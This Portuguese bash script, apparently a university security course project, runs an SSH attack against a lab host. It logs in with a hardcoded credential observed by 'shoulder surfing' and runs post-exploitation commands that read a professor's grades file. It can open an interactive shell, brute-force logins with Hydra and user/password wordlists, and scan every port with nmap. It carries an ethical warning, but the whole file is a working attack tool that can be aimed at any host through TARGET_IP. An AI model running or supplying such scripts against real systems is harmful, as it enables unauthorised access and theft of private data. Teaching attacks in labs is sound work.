#!/bin/bash

# Script de Ataque SSH - Brute Force
# Demonstra VULNERABILIDADE #1: Acesso SSH não autorizado
# Trabalho Final - Segurança da Informação
# Uso: ./ataque_ssh_bruteforce.sh

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configurações
TARGET_IP="${TARGET_IP:-172.20.0.10}"
TARGET_PORT="22"
WORDLIST_USER="/root/wordlists/usuarios_comuns.txt"
WORDLIST_PASS="/root/wordlists/senhas_comuns.txt"
LOG_FILE="/root/logs/ataque_ssh_$(date +%Y%m%d_%H%M%S).log"

# Banner
echo -e "${RED}"
cat <<"EOF"
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║     🎯 ATAQUE SSH BRUTE-FORCE - Demonstração Educacional ║
║                                                           ║
║  Simula o cenário do aluno que obteve credenciais do     ║
║  professor por shoulder surfing (observação visual)      ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo -e "${YELLOW}[!] AVISO ÉTICO${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Este script é para fins educacionais e demonstração do trabalho."
echo "Uso não autorizado em sistemas reais é ILEGAL."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo

# Função de logging
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Menu de modos de ataque
echo -e "${BLUE}MODOS DE ATAQUE DISPONÍVEIS:${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "1. Ataque Direcionado (credencial conhecida) - Simula cenário real"
echo "2. Brute-force com wordlist (demonstração)"
echo "3. Testar conectividade apenas"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
read -p "Escolha o modo [1-3]: " MODE
echo

case $MODE in
    1)
        echo -e "${GREEN}[*] MODO 1: Ataque Direcionado (Cenário Real)${NC}"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "Cenário: Aluno observou professor digitando 'senha123'"
        echo

        TARGET_USER="professor"
        TARGET_PASS="senha123"

        log "Iniciando ataque direcionado contra ${TARGET_IP}:${TARGET_PORT}"
        log "Usuário: ${TARGET_USER}"

        echo "[*] Verificando conectividade com alvo..."
        if ! ping -c 1 -W 2 "$TARGET_IP" > /dev/null 2>&1; then
            echo -e "${RED}[✗] Alvo não acessível. Verifique a rede.${NC}"
            exit 1
        fi
        echo -e "${GREEN}[✓] Alvo acessível${NC}"

        echo "[*] Verificando porta SSH (22)..."
        if ! timeout 2 bash -c "echo >/dev/tcp/$TARGET_IP/$TARGET_PORT" 2>/dev/null; then
            echo -e "${RED}[✗] Porta SSH não acessível${NC}"
            exit 1
        fi
        echo -e "${GREEN}[✓] Porta SSH aberta${NC}"

        echo
        echo "[*] Tentando autenticação SSH..."
        echo "    Usuário: ${TARGET_USER}"
        echo "    Senha: ${TARGET_PASS}"
        echo

        # Tentar login com sshpass
        if command -v sshpass > /dev/null 2>&1; then
            OUTPUT=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                "${TARGET_USER}@${TARGET_IP}" "echo 'SSH_ACCESS_SUCCESSFUL'" 2>&1)

            if echo "$OUTPUT" | grep -q "SSH_ACCESS_SUCCESSFUL"; then
                echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
                echo -e "${GREEN}║           ✅ ATAQUE BEM-SUCEDIDO!                         ║${NC}"
                echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
                log "SUCESSO: Acesso SSH obtido com ${TARGET_USER}:${TARGET_PASS}"
                echo
                echo "Credenciais válidas:"
                echo "  Usuário: ${TARGET_USER}"
                echo "  Senha: ${TARGET_PASS}"
                echo "  IP: ${TARGET_IP}"
                echo
                echo -e "${YELLOW}[*] Demonstrando comandos pós-exploração...${NC}"
                echo

                # Executar comandos de reconhecimento
                echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                echo "COMANDOS EXECUTADOS NA MÁQUINA VÍTIMA:"
                echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

                echo "[CMD] whoami"
                sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                    "${TARGET_USER}@${TARGET_IP}" "whoami" 2>/dev/null

                echo
                echo "[CMD] id"
                sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                    "${TARGET_USER}@${TARGET_IP}" "id" 2>/dev/null

                echo
                echo "[CMD] pwd"
                sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                    "${TARGET_USER}@${TARGET_IP}" "pwd" 2>/dev/null

                echo
                echo "[CMD] ls -la /home/professor/Documentos"
                sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                    "${TARGET_USER}@${TARGET_IP}" "ls -la /home/professor/Documentos" 2>/dev/null

                echo
                echo "[CMD] cat /home/professor/Documentos/notas_alunos.csv"
                sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                    "${TARGET_USER}@${TARGET_IP}" "cat /home/professor/Documentos/notas_alunos.csv" 2>/dev/null

                echo
                echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                echo

                echo -e "${YELLOW}[!] IMPACTO DO ATAQUE:${NC}"
                echo "  ✗ Acesso total à conta do professor"
                echo "  ✗ Visualização de arquivos sensíveis (notas, provas)"
                echo "  ✗ Possibilidade de modificar/deletar arquivos"
                echo "  ✗ Possibilidade de escalar privilégios (sudo sem senha)"
                echo "  ✗ Instalação de backdoors para persistência"
                echo

                # Salvar sessão interativa
                echo -e "${BLUE}[?] Deseja abrir sessão SSH interativa? (s/n)${NC}"
                read -p "> " INTERACTIVE

                if [[ $INTERACTIVE =~ ^[sS]$ ]]; then
                    echo "[*] Abrindo sessão SSH interativa..."
                    echo "    Digite 'exit' para sair da sessão"
                    echo
                    sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                        "${TARGET_USER}@${TARGET_IP}"
                fi

            else
                echo -e "${RED}[✗] Falha na autenticação${NC}"
                log "FALHA: Não foi possível autenticar com credenciais fornecidas"
                echo "Verifique se as credenciais estão corretas ou se o SSH está configurado."
            fi
        else
            echo -e "${RED}[✗] Ferramenta 'sshpass' não encontrada${NC}"
            echo "Tentando com Hydra..."

            hydra -l "${TARGET_USER}" -p "${TARGET_PASS}" "ssh://${TARGET_IP}" -V 2>&1 | tee -a "$LOG_FILE"
        fi
        ;;

    2)
        echo -e "${GREEN}[*] MODO 2: Brute-force com Wordlist${NC}"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "Demonstração: Tentativas com múltiplas credenciais"
        echo

        log "Iniciando brute-force com wordlist"

        if [[ ! -f "$WORDLIST_USER" ]]; then
            echo -e "${RED}[✗] Wordlist de usuários não encontrada: $WORDLIST_USER${NC}"
            exit 1
        fi

        if [[ ! -f "$WORDLIST_PASS" ]]; then
            echo -e "${RED}[✗] Wordlist de senhas não encontrada: $WORDLIST_PASS${NC}"
            exit 1
        fi

        echo "[*] Wordlist de usuários: $WORDLIST_USER"
        echo "[*] Wordlist de senhas: $WORDLIST_PASS"
        echo "[*] Alvo: ssh://${TARGET_IP}"
        echo
        echo "[!] Iniciando ataque com Hydra..."
        echo

        hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "ssh://${TARGET_IP}" -t 4 -V 2>&1 | tee -a "$LOG_FILE"

        echo
        log "Ataque brute-force concluído"
        ;;

    3)
        echo -e "${GREEN}[*] MODO 3: Teste de Conectividade${NC}"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

        echo "[*] Testando conectividade com ${TARGET_IP}..."
        ping -c 4 "$TARGET_IP"

        echo
        echo "[*] Escaneando portas abertas..."
        nmap -sV -p- "$TARGET_IP" 2>&1 | tee -a "$LOG_FILE"
        ;;

    *)
        echo -e "${RED}[✗] Opção inválida${NC}"
        exit 1
        ;;
esac

echo
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "${GREEN}[✓] Script concluído${NC}"
echo "Log salvo em: $LOG_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
